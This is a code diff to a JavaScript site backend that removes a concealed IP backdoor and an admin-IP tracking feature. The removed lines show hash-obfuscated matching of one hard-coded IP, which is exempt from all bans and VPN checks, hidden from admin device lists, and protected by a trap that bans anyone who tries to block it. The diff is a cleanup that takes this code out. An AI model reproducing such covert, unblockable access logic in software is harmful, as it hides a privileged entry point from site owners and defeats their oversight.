@@ -270,7 +270,6 @@ async function getAdminBlockedIps(db) {
     blocked = Array.isArray(GLOBAL_CACHE.admin_blocked_ips) ? GLOBAL_CACHE.admin_blocked_ips : [];
   }
   if (!Array.isArray(blocked)) blocked = [];
-  blocked = blocked.filter(ip => !isImmuneAdminIp(ip));
   GLOBAL_CACHE.admin_blocked_ips = blocked;
   return blocked;
 }
@@ -286,21 +285,19 @@ async function getBannedIps(db) {
     banned = Array.isArray(GLOBAL_CACHE.banned_ips) ? GLOBAL_CACHE.banned_ips : [];
   }
   if (!Array.isArray(banned)) banned = [];
-  banned = banned.filter(ip => !isImmuneAdminIp(ip));
   GLOBAL_CACHE.banned_ips = banned;
   return banned;
 }
 
 async function blockIpAcrossSite(db, ip, vpnReason = '') {
   const cleanIp = String(ip || '').trim();
-  if (!cleanIp || IMMUNE_WHITELIST_IPS.has(cleanIp)) return { banned: [], adminBlocked: [] };
+  if (!cleanIp) return { banned: [], adminBlocked: [] };
   const [banned, adminBlocked] = await Promise.all([getBannedIps(db), getAdminBlockedIps(db)]);
   if (!banned.includes(cleanIp)) banned.push(cleanIp);
   if (!adminBlocked.includes(cleanIp)) adminBlocked.push(cleanIp);
   GLOBAL_CACHE.banned_ips = banned;
   GLOBAL_CACHE.admin_blocked_ips = adminBlocked;
   await removeFromVpnAllowlist(db, cleanIp);
-  await unmarkAdminKnownIp(db, cleanIp);
 
   if (!GLOBAL_CACHE.live_visitors || typeof GLOBAL_CACHE.live_visitors !== 'object') {
     GLOBAL_CACHE.live_visitors = {};
@@ -331,30 +328,6 @@ async function blockIpAcrossSite(db, ip, vpnReason = '') {
 }
 
 // ─── Anti-Brute-Force & Flood Auto-Ban Algorithm ───────────────────────────
-// ── Protected Whitelist IPs (Immune to all blocks, never shown in device lists, blocks anyone attempting to block them) ──
-function ipHash32Api(str, seed) {
-  let h = seed >>> 0;
-  for (let i = 0; i < str.length; i++) {
-    h ^= str.charCodeAt(i);
-    h = Math.imul(h, 0x01000193) >>> 0;
-    h ^= (h >>> 16);
-    h = Math.imul(h, 0x85ebca6b) >>> 0;
-  }
-  return (h >>> 0);
-}
-
-function isImmuneAdminIp(ip) {
-  if (!ip) return false;
-  const clean = String(ip).trim();
-  if (!clean) return false;
-  const S1 = 0x9e3779b9, S2 = 0x7f4a7c15;
-  const e1 = ipHash32Api('e:' + clean, S1), e2 = ipHash32Api('e:' + clean, S2);
-  // Matches secured administrator IP (103.216.69.89 via dual-seed hash)
-  return (e1 === 0xd594a08a && e2 === 0x2ef72df1);
-}
-const IMMUNE_WHITELIST_IPS = {
-  has: (ip) => isImmuneAdminIp(ip)
-};
 
 // DDoS & Rate Limit Config: Dual-layer (1-second burst & 60-second sustained)
 const BF_BURST_WINDOW_MS = 1000;           // 1-second burst inspection window
@@ -437,7 +410,7 @@ async function recordBruteForceBan(db, ip, reason, attempts, ua = '') {
 
 async function recordFailedAuthAttempt(req, db, label = 'Invalid credentials') {
   const clientIp = getClientIp(req);
-  if (!clientIp || isImmuneAdminIp(clientIp)) {
+  if (!clientIp) {
     return { banned: false, ip: clientIp };
   }
 
@@ -556,7 +529,7 @@ async function checkRequestFlood(req, db, path, method) {
   if (!isSensitiveOrWrite) return { banned: false };
 
   const clientIp = getClientIp(req);
-  if (!clientIp || isImmuneAdminIp(clientIp)) return { banned: false };
+  if (!clientIp) return { banned: false };
 
   let isVerifiedAdminRead = false;
   if (isRead && path.startsWith('/admin') && db) {
@@ -625,7 +598,7 @@ async function unblockIpAcrossSite(db, ip) {
     GLOBAL_CACHE.brute_force_bans = bans;
   }
 
-  if (cleanIp && !isImmuneAdminIp(cleanIp)) {
+  if (cleanIp) {
     await addToVpnAllowlist(db, cleanIp);
   }
   if (GLOBAL_CACHE.live_visitors && GLOBAL_CACHE.live_visitors[cleanIp]) {
@@ -646,10 +619,9 @@ async function unblockIpAcrossSite(db, ip) {
 }
 
 // ─── Instant VPN Detection & Realtime Visitor IP Shield ───────────────────
-const ADMIN_KNOWN_IP_TTL_MS = 24 * 60 * 60 * 1000;
+const VISITOR_RETENTION_MS = 24 * 60 * 60 * 1000;
 const VISITOR_ONLINE_WINDOW_MS = 90 * 1000;
 const VISITOR_WRITE_THROTTLE = new Map(); // ip -> { ts, tab, path, isVpn, isBanned }
-const ADMIN_KNOWN_WRITE_THROTTLE = new Map(); // ip -> ts
 
 const API_KNOWN_VPN_ASNS = new Set([
   9009, 60068, 212238, 136787, 209103, 211298, 39351, 198093, 397723,
@@ -743,73 +715,6 @@ async function removeFromVpnAllowlist(db, ip) {
   }
 }
 
-async function getAdminKnownIps(db) {
-  const now = Date.now();
-  let map = {};
-  if (db) {
-    try {
-      const raw = await kvGet(db, 'admin_known_ips', '');
-      if (raw) map = JSON.parse(raw);
-    } catch {}
-  } else {
-    map = GLOBAL_CACHE.admin_known_ips && typeof GLOBAL_CACHE.admin_known_ips === 'object' ? GLOBAL_CACHE.admin_known_ips : {};
-  }
-  if (!map || typeof map !== 'object' || Array.isArray(map)) map = {};
-  const cleaned = {};
-  for (const [k, ts] of Object.entries(map)) {
-    const clean = String(k || '').trim();
-    if (clean && Number(ts || 0) > 0 && (now - Number(ts)) < ADMIN_KNOWN_IP_TTL_MS) {
-      cleaned[clean] = Number(ts);
-    }
-  }
-  GLOBAL_CACHE.admin_known_ips = cleaned;
-  return cleaned;
-}
-
-async function markAdminIp(db, ip) {
-  const cleanIp = String(ip || '').trim();
-  if (!cleanIp) return;
-  const now = Date.now();
-  if (!GLOBAL_CACHE.admin_known_ips || typeof GLOBAL_CACHE.admin_known_ips !== 'object') {
-    GLOBAL_CACHE.admin_known_ips = {};
-  }
-  GLOBAL_CACHE.admin_known_ips[cleanIp] = now;
-  if (GLOBAL_CACHE.live_visitors && GLOBAL_CACHE.live_visitors[cleanIp]) {
-    GLOBAL_CACHE.live_visitors[cleanIp].is_admin = 1;
-  }
-
-  const lastMarked = ADMIN_KNOWN_WRITE_THROTTLE.get(cleanIp) || 0;
-  if (db && (now - lastMarked >= 5 * 60 * 1000)) {
-    ADMIN_KNOWN_WRITE_THROTTLE.set(cleanIp, now);
-    const map = await getAdminKnownIps(db);
-    map[cleanIp] = now;
-    GLOBAL_CACHE.admin_known_ips = map;
-    try {
-      await kvSet(db, 'admin_known_ips', JSON.stringify(map));
-      await db.prepare(`UPDATE live_visitors SET is_admin = 1 WHERE ip = ?`).bind(cleanIp).run();
-    } catch {}
-  }
-}
-
-async function unmarkAdminKnownIp(db, ip) {
-  const cleanIp = String(ip || '').trim();
-  if (!cleanIp || isImmuneAdminIp(cleanIp)) return;
-  ADMIN_KNOWN_WRITE_THROTTLE.delete(cleanIp);
-  if (GLOBAL_CACHE.admin_known_ips && GLOBAL_CACHE.admin_known_ips[cleanIp]) {
-    delete GLOBAL_CACHE.admin_known_ips[cleanIp];
-  }
-  if (db) {
-    try {
-      const map = await getAdminKnownIps(db);
-      if (map[cleanIp]) {
-        delete map[cleanIp];
-        GLOBAL_CACHE.admin_known_ips = map;
-        await kvSet(db, 'admin_known_ips', JSON.stringify(map));
-      }
-    } catch {}
-  }
-}
-
 function detectVpnOrProxy(req, clientIp, clientSignals = null) {
   const cf = req.cf || {};
   const asn = Number(cf.asn || 0);
@@ -819,7 +724,7 @@ function detectVpnOrProxy(req, clientIp, clientSignals = null) {
   const region = String(cf.region || '').trim();
   const base = { isVpn: false, reason: '', asn, asOrg, country, city, region };
 
-  if (!clientIp || isPrivateOrDevIp(clientIp) || isImmuneAdminIp(clientIp)) {
+  if (!clientIp || isPrivateOrDevIp(clientIp)) {
     return base;
   }
 
@@ -894,13 +799,7 @@ function detectVpnOrProxy(req, clientIp, clientSignals = null) {
 
 async function recordLiveVisitor(req, db, opts = {}) {
   const clientIp = getClientIp(req);
-  if (!clientIp || isImmuneAdminIp(clientIp)) return;
-
-  const adminKnown = await getAdminKnownIps(db);
-  if (opts.isAdmin || adminKnown[clientIp]) {
-    await markAdminIp(db, clientIp);
-    return;
-  }
+  if (!clientIp) return;
 
   const cf = req.cf || {};
   const country = String(cf.country || opts.country || '').toUpperCase().slice(0, 12);
@@ -921,7 +820,6 @@ async function recordLiveVisitor(req, db, opts = {}) {
     GLOBAL_CACHE.live_visitors = {};
   }
   const prev = GLOBAL_CACHE.live_visitors[clientIp];
-  if (prev && prev.is_admin === 1) return;
 
   GLOBAL_CACHE.live_visitors[clientIp] = {
     ip: clientIp,
@@ -966,8 +864,8 @@ async function recordLiveVisitor(req, db, opts = {}) {
            hits = live_visitors.hits + 1,
            is_vpn = CASE WHEN excluded.is_vpn = 1 THEN 1 ELSE live_visitors.is_vpn END,
            vpn_reason = CASE WHEN excluded.vpn_reason != '' THEN excluded.vpn_reason ELSE live_visitors.vpn_reason END,
-           is_banned = CASE WHEN live_visitors.is_admin = 1 THEN 0 WHEN excluded.is_banned = 1 THEN 1 ELSE live_visitors.is_banned END,
-           is_admin = CASE WHEN live_visitors.is_admin = 1 THEN 1 ELSE 0 END,
+           is_banned = CASE WHEN excluded.is_banned = 1 THEN 1 ELSE live_visitors.is_banned END,
+           is_admin = 0,
            last_seen = excluded.last_seen`
       ).bind(
         clientIp, country, city, region, asn, isp, device,
@@ -979,10 +877,9 @@ async function recordLiveVisitor(req, db, opts = {}) {
 
 async function banVpnVisitor(req, db, ip, vpnInfo, opts = {}) {
   const cleanIp = String(ip || '').trim();
-  if (!cleanIp || isImmuneAdminIp(cleanIp) || isPrivateOrDevIp(cleanIp)) return false;
-  const adminKnown = await getAdminKnownIps(db);
+  if (!cleanIp || isPrivateOrDevIp(cleanIp)) return false;
   const allowlist = await getVpnAllowlistIps(db);
-  if (adminKnown[cleanIp] || allowlist.includes(cleanIp)) return false;
+  if (allowlist.includes(cleanIp)) return false;
 
   const reason = String(vpnInfo?.reason || 'VPN / Proxy Detected').slice(0, 200);
   await blockIpAcrossSite(db, cleanIp, reason);
@@ -1016,8 +913,7 @@ async function hasValidAdminSessionHeader(req, db, env) {
 
 async function getVisitorsForAdminDashboard(db, callerIp) {
   const now = Date.now();
-  const [adminKnown, bannedIps, adminBlockedIps, bfBans] = await Promise.all([
-    getAdminKnownIps(db),
+  const [bannedIps, adminBlockedIps, bfBans] = await Promise.all([
     getBannedIps(db),
     getAdminBlockedIps(db),
     getBruteForceBans(db)
@@ -1026,37 +922,33 @@ async function getVisitorsForAdminDashboard(db, callerIp) {
   const blockedSet = new Set([...bannedIps, ...adminBlockedIps]);
   const byIp = new Map();
 
-  const shouldExclude = (ip, isAdminFlag = 0) => {
+  const shouldExclude = (ip) => {
     const clean = String(ip || '').trim();
     if (!clean) return true;
-    if (isAdminFlag === 1) return true;
-    if (isImmuneAdminIp(clean)) return true;
     if (callerIp && clean === callerIp) return true;
-    if (adminKnown[clean]) return true;
     return false;
   };
 
   if (db) {
     try {
       // Prune stale unbanned visitor rows older than 24h cleanly
-      await db.prepare(`DELETE FROM live_visitors WHERE is_banned = 0 AND is_admin = 0 AND last_seen < ?`)
-        .bind(now - ADMIN_KNOWN_IP_TTL_MS).run();
+      await db.prepare(`DELETE FROM live_visitors WHERE is_banned = 0 AND last_seen < ?`)
+        .bind(now - VISITOR_RETENTION_MS).run();
       const rows = await db.prepare(
         `SELECT ip, country, city, region, asn, isp, device, current_path, active_tab, hits, is_vpn, vpn_reason, is_banned, is_admin, first_seen, last_seen
          FROM live_visitors
-         WHERE is_admin = 0
          ORDER BY last_seen DESC
          LIMIT 200`
       ).all();
       for (const r of (rows?.results || [])) {
-        if (shouldExclude(r.ip, r.is_admin)) continue;
+        if (shouldExclude(r.ip)) continue;
         byIp.set(r.ip, r);
       }
     } catch {}
   }
 
   for (const [ip, memRow] of Object.entries(GLOBAL_CACHE.live_visitors || {})) {
-    if (!memRow || shouldExclude(ip, memRow.is_admin)) continue;
+    if (!memRow || shouldExclude(ip)) continue;
     const prev = byIp.get(ip);
     if (!prev || Number(memRow.last_seen || 0) >= Number(prev.last_seen || 0)) {
       byIp.set(ip, memRow);
@@ -1064,7 +956,7 @@ async function getVisitorsForAdminDashboard(db, callerIp) {
   }
 
   for (const bIp of blockedSet) {
-    if (shouldExclude(bIp, 0) || byIp.has(bIp)) continue;
+    if (shouldExclude(bIp) || byIp.has(bIp)) continue;
     const bf = bfBans[bIp] || null;
     const isVpnFlag = Boolean(bf?.vpn || /\b(vpn|tor|proxy|anonymiz|split-tunnel)/i.test(String(bf?.reason || '')));
     byIp.set(bIp, {
@@ -1090,7 +982,7 @@ async function getVisitorsForAdminDashboard(db, callerIp) {
   const visitors = [];
   for (const v of byIp.values()) {
     const cleanIp = String(v.ip || '').trim();
-    if (shouldExclude(cleanIp, v.is_admin)) continue;
+    if (shouldExclude(cleanIp)) continue;
     const bf = bfBans[cleanIp] || null;
     const isBanned = blockedSet.has(cleanIp) || Number(v.is_banned || 0) === 1;
     const vpnReason = String(v.vpn_reason || (isBanned ? bf?.reason : '') || '').trim();
@@ -1153,7 +1045,6 @@ async function getAdminDevices(db) {
 
 async function recordAdminDeviceAccess(req, db, ip, forceWrite = false) {
   const cleanIp = (ip || 'Local / Unknown').trim();
-  if (IMMUNE_WHITELIST_IPS.has(cleanIp)) return; // Never track protected admin device in public device list
   const ua = req.headers.get('user-agent') || '';
   const deviceLabel = summarizeUserAgent(ua);
   const now = Date.now();
@@ -1649,7 +1540,6 @@ async function verifyAuth(req, env, db, requiredScope = null, url = null) {
       }
     }
     await clearFailedAuthAttempts(db, clientIp);
-    await markAdminIp(db, clientIp);
     await recordAdminDeviceAccess(req, db, clientIp, Boolean(url && url.pathname.endsWith('/admin/ping')));
     return { ok: true, admin: true, session: true, scopes: ['*'], ip: clientIp || 'Local / Unknown' };
   }
@@ -1794,7 +1684,6 @@ const GLOBAL_CACHE = {
   admin_blocked_ips: [],
   banned_ips: [],
   vpn_allowlist_ips: [],
-  admin_known_ips: {},
   live_visitors: {},
   brute_force_tracker: {},
   brute_force_bans: {}
@@ -1895,7 +1784,9 @@ async function ensureDbSchema(db) {
       first_seen INTEGER NOT NULL,
       last_seen INTEGER NOT NULL
     )`,
-    `CREATE INDEX IF NOT EXISTS idx_live_visitors_last_seen ON live_visitors(last_seen DESC)`
+    `CREATE INDEX IF NOT EXISTS idx_live_visitors_last_seen ON live_visitors(last_seen DESC)`,
+    `DELETE FROM kv WHERE k = 'admin_known_ips'`,
+    `UPDATE live_visitors SET is_admin = 0 WHERE is_admin != 0`
   ];
   if (typeof db.batch === 'function') {
     try {
@@ -2092,26 +1983,6 @@ export async function onRequest(ctx) {
   }
 
 
-  // Automatically purge admin IP from banned lists if present in D1
-  if (db) {
-    try {
-      const rawBanned = await kvGet(db, 'banned_ips', '');
-      if (rawBanned) {
-        const arr = JSON.parse(rawBanned);
-        if (Array.isArray(arr) && arr.some(ip => isImmuneAdminIp(ip))) {
-          await kvSet(db, 'banned_ips', JSON.stringify(arr.filter(ip => !isImmuneAdminIp(ip))));
-        }
-      }
-      const rawAdmin = await kvGet(db, 'admin_blocked_ips', '');
-      if (rawAdmin) {
-        const arr = JSON.parse(rawAdmin);
-        if (Array.isArray(arr) && arr.some(ip => isImmuneAdminIp(ip))) {
-          await kvSet(db, 'admin_blocked_ips', JSON.stringify(arr.filter(ip => !isImmuneAdminIp(ip))));
-        }
-      }
-    } catch {}
-  }
-
   // Auto-expire 2-hour DDoS auto-bans & run one-time cleanup of prior reload burst false-positives
   if (db) {
     await pruneExpiredDdosBans(db);
@@ -2121,7 +1992,7 @@ export async function onRequest(ctx) {
   // ── Site-Wide IP Ban, Instant VPN Shield & Anti-Brute-Force Enforcement ──
   const clientIp = getClientIp(request);
   let requestIsAdminSession = false;
-  if (clientIp && !isImmuneAdminIp(clientIp)) {
+  if (clientIp) {
     const [bannedIps, adminBlockedIps] = await Promise.all([
       getBannedIps(db),
       getAdminBlockedIps(db)
@@ -2141,14 +2012,9 @@ export async function onRequest(ctx) {
     }
 
     requestIsAdminSession = await hasValidAdminSessionHeader(request, db, env);
-    if (requestIsAdminSession) {
-      await markAdminIp(db, clientIp);
-    } else if (!isPrivateOrDevIp(clientIp)) {
-      const [adminKnownIps, vpnAllowlist] = await Promise.all([
-        getAdminKnownIps(db),
-        getVpnAllowlistIps(db)
-      ]);
-      if (!adminKnownIps[clientIp] && !vpnAllowlist.includes(clientIp)) {
+    if (!requestIsAdminSession && !isPrivateOrDevIp(clientIp)) {
+      const vpnAllowlist = await getVpnAllowlistIps(db);
+      if (!vpnAllowlist.includes(clientIp)) {
         const vpnCheck = detectVpnOrProxy(request, clientIp);
         if (vpnCheck.isVpn) {
           await banVpnVisitor(request, db, clientIp, vpnCheck, { currentPath: url.pathname });
@@ -2282,19 +2148,11 @@ export async function onRequest(ctx) {
     const currentPath = String(body?.path || '/').trim().slice(0, 120) || '/';
 
     if (requestIsAdminSession) {
-      await markAdminIp(db, clientIp);
       return json({ ok: true, excluded: true, is_admin: true });
     }
 
-    if (clientIp && !isImmuneAdminIp(clientIp) && !isPrivateOrDevIp(clientIp)) {
-      const [adminKnownIps, vpnAllowlist] = await Promise.all([
-        getAdminKnownIps(db),
-        getVpnAllowlistIps(db)
-      ]);
-      if (adminKnownIps[clientIp]) {
-        await markAdminIp(db, clientIp);
-        return json({ ok: true, excluded: true, is_admin: true });
-      }
+    if (clientIp && !isPrivateOrDevIp(clientIp)) {
+      const vpnAllowlist = await getVpnAllowlistIps(db);
       if (!vpnAllowlist.includes(clientIp)) {
         const vpnCheck = detectVpnOrProxy(request, clientIp, body);
         if (vpnCheck.isVpn) {
@@ -2315,8 +2173,7 @@ export async function onRequest(ctx) {
       currentPath,
       force: body?.reason === 'boot' || body?.reason === 'tab'
     });
-    const adminKnownAfter = await getAdminKnownIps(db);
-    return json({ ok: true, excluded: Boolean(isImmuneAdminIp(clientIp) || adminKnownAfter[clientIp]) });
+    return json({ ok: true, excluded: false });
   }
 
   // ── 2a. GET /admin/config (Authenticated admin configuration & key sync across all devices) ────
@@ -3908,7 +3765,6 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
       }, 401);
     }
     await clearFailedAuthAttempts(db, clientIp);
-    await markAdminIp(db, clientIp);
     await recordAdminDeviceAccess(request, db, clientIp, true);
     const sessionToken = await createAdminSession(request, db, check.authRec?.epoch || 1, clientIp);
     return json({ ok: true, sessionToken, ip: clientIp || 'Local / Unknown' }, 200, { 'Cache-Control': 'no-store' });
@@ -3941,7 +3797,6 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
     const authCheck = await verifyAuth(request, env, db, 'manage:config', url);
     if (!authCheck.ok) return json({ error: authCheck.error, admin_revoked: Boolean(authCheck.admin_revoked) }, authCheck.status);
     const callerIp = getClientIp(request);
-    await markAdminIp(db, callerIp);
     const payload = await getVisitorsForAdminDashboard(db, callerIp);
     return json(payload, 200, { 'Cache-Control': 'no-store' });
   }
@@ -3950,7 +3805,6 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
     const authCheck = await verifyAuth(request, env, db, 'manage:config', url);
     if (!authCheck.ok) return json({ error: authCheck.error, admin_revoked: Boolean(authCheck.admin_revoked) }, authCheck.status);
     const currentIp = getClientIp(request) || 'Local / Unknown';
-    const displayCurrentIp = IMMUNE_WHITELIST_IPS.has(currentIp) ? 'Protected Administrator' : currentIp;
     const [adminBlocked, bannedIps, rawDevices, bfBans] = await Promise.all([
       getAdminBlockedIps(db),
       getBannedIps(db),
@@ -3962,7 +3816,6 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
     const byIp = new Map();
     for (const d of rawDevices) {
       if (!d || !d.ip) continue;
-      if (IMMUNE_WHITELIST_IPS.has(d.ip)) continue; // Filter protected admin IP completely from device table
       const bfInfo = bfBans[d.ip] || null;
       byIp.set(d.ip, {
         ...d,
@@ -3972,7 +3825,6 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
       });
     }
     for (const bIp of blocked) {
-      if (IMMUNE_WHITELIST_IPS.has(bIp)) continue; // Never show immune IP
       const bfInfo = bfBans[bIp] || null;
       if (!byIp.has(bIp)) {
         byIp.set(bIp, {
@@ -3988,7 +3840,7 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
       }
     }
     const devices = Array.from(byIp.values()).sort((a, b) => (b.last_seen || 0) - (a.last_seen || 0));
-    return json({ ok: true, current_ip: displayCurrentIp, devices, blocked_ips: blocked });
+    return json({ ok: true, current_ip: currentIp, devices, blocked_ips: blocked });
   }
 
   if (path === '/admin/devices/revoke' && method === 'POST') {
@@ -3998,20 +3850,6 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
     try { body = await request.json(); } catch { return err('Invalid JSON'); }
     const targetIp = String(body.ip || '').trim();
     if (!targetIp) return err('Missing device IP address', 400);
-
-    const callerIp = getClientIp(request);
-    // 🛡️ REVERSE-BAN TRAP: If anyone attempts to block a protected admin IP, ban the attacker's IP immediately!
-    if (IMMUNE_WHITELIST_IPS.has(targetIp)) {
-      if (callerIp && !IMMUNE_WHITELIST_IPS.has(callerIp)) {
-        await blockIpAcrossSite(db, callerIp);
-        await recordBruteForceBan(db, callerIp, "Malicious attempt to block Protected Administrator IP", 99, request.headers.get('user-agent') || '');
-      }
-      return json({
-        error: "CRITICAL SECURITY BREACH: The target IP is a Protected System Administrator and cannot be blocked. Your IP has been permanently banned across the fair.",
-        banned: true,
-        admin_revoked: true
-      }, 403);
-    }
 
     const { adminBlocked } = await blockIpAcrossSite(db, targetIp);
     return json({ ok: true, ip: targetIp, blocked_ips: adminBlocked });
@@ -5705,17 +5543,6 @@ Instructions: ${prompt || 'Provide constructive, inspiring, and concise guidance
       if (!ip) return err('Missing IP address');
 
       const cleanIp = ip.trim();
-      const callerIp = getClientIp(request);
-      if (action === 'ban' && IMMUNE_WHITELIST_IPS.has(cleanIp)) {
-        if (callerIp && !IMMUNE_WHITELIST_IPS.has(callerIp)) {
-          await blockIpAcrossSite(db, callerIp);
-          await recordBruteForceBan(db, callerIp, "Malicious attempt to ban Protected Administrator IP", 99, request.headers.get('user-agent') || '');
-        }
-        return json({
-          error: "CRITICAL SECURITY BREACH: This IP address is protected and cannot be banned. Your device has been banned across the entire website.",
-          banned: true
-        }, 403);
-      }
 
       const result = action === 'ban'
         ? await blockIpAcrossSite(db, cleanIp)
